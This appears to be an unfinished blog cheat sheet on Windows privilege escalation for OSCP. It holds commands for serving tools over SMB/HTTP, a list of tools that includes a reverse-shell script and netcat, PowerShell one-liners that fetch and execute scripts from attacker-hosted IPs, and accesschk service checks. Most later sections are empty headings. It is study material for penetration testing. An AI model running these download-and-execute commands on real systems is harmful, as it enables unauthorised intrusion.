---
layout: post
title: Windows PrivEsc cheatsheet
tags: [OSCP, Cheatsheet, Windows]
description: "Windows PrivEsc cheatsheet"
---

# Table of contents

- [Introduction](#introduction)
- [Tools](#tools)
- [Kernel](#kernel)
- [Services](#services)
  - [BinPath](#binpath)
  - [Unquoted Service Path](#unquoted-service-path)
  - [Registry](#registry)
  - [Executable file](#executable-file)
  - [DLL Hijacking](#dll-hijacking)
- [Password mining](#password-mining)
  - [Passwords stored by user](#passwords-stored-by-user)
  - [Registry](#registry)
  - [Configuration Files](#configuration-files)
- [Registry](#registry)
  - [AutoRun](#autorun)
  - [AllwaysInstallElevated](#allwaysinstallelevated)
- [Scheduled Tasks](#scheduled-tasks)
- [Hot Potato](#hot-potato)
  - [Detect](#detect)
  - [Exploit](#exploit)
- [Startup Aplications](#startup-aplications)
- [Firewalled Services](#firewalled-services)

# Introduction
The goal of this cheat sheet is to provide a quick overview of possible attack vectors that can be used to elevate your privileges to the system. For each attack vector, it explains how to detect if a system is vulnerable and gives an example of how to exploit it.   

# Tools
Before learning about the different attack vectors, I listed some commands for the general privesc enumeration scripts that I used during OSCP. To gain some efficiency, I moved all the scripts into a directory and made them accessible remotely through the samba service or via the web.   
```
#host files in current directory through smb
impacket-smbserver share $(pwd)
impacket-smbserver -smb2support share $(pwd)   // for Windows 10

#host files in current directory through http
python -m SimpleHTTPServer 8080
python3 -m http.server 8080
```

Below, I listed the different PrivEsc tools and files that I would generally have hosted through the **SMB** and **HTTP** server for quick access.
```
accesschk64.exe
accesschk.exe
accesschk-XP.exe
Invoke-PowerShellTcp.ps1
PowerUp.ps1
SharpUp.exe
Sherlock.ps1
windows-exploit-suggester2.py
winPEASany.exe
winPEASx64.exe
winPEASx86.exe
winbin/ #a copy of windows binaries in /usr/share/windows-binaries/
    nc64.exe
    nc.exe
    plink.exe
    wget.exe
    whoami.exe
    chisel.exe
```

I used the following commands to launch the tools quickly without having to transfer them first on the target itself.  
```
#WinPEAS - I love this tool
//192.168.194.141/share/winPEASx64.exe searchall cmd
#PowerUp
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.73:1234/PowerUp.ps1'); Invoke-AllChecks"
#Sherlock
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.194.141:1234/Sherlock.ps1'); Find-AllVulns"
```

# Kernel
Missing patches are probably the easiest way to improve your privileges. However, this can make your target system unstable, so only use them when you are desperate, I recommend taking this route as a last resort as there are times when the system can corrupt and lead to problems when hacking the machine.  


**Detect if vulnerable:** Get patchlevel and check for exploits  
```
#Check for what services we have write access by specifying one of our user roles (also check for the power users group)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

#Check our permissions for one specific service
accesschk.exe -ucqv daclsvc 

#Check under what privileges a system runs 
sc qc daclsvc 
```

# Services
## BinPath
## Unquoted Service Path
## Registry
## Executable File
## DLL Hijacking
# Password mining
## Passwords stored by user
## Registry
## Configuration Files
# Registry
## AutoRun
## AllwaysInstallElevated
# Scheduled Tasks
# Hot Potato
## Detect
## Exploit
# Startup Aplications
# Firewalled Services
